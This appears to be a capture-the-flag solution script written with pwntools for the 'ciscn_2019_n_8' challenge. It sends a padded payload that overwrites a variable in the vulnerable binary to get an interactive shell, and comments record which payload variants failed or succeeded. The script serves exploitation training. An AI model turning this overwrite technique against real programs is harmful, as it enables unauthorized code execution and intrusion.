from pwn import *

context.os = "linux"
context.arch = "i386"

if args.LOCAL:
    p = process("./ciscn_2019_n_8")
    gdb.attach(p, "b puts")
else:
    p = remote("node3.buuoj.cn", 26578)

# payload = b'a'*14 # fail
# payload = b'aaaa' * 13 + p64(17) # success
# payload = b'aaaa' * 13 + p32(17) + p32(0) # success
payload = b'aaaa'*13 + p64(1)

p.sendlineafter("name?\n", payload)

p.interactive()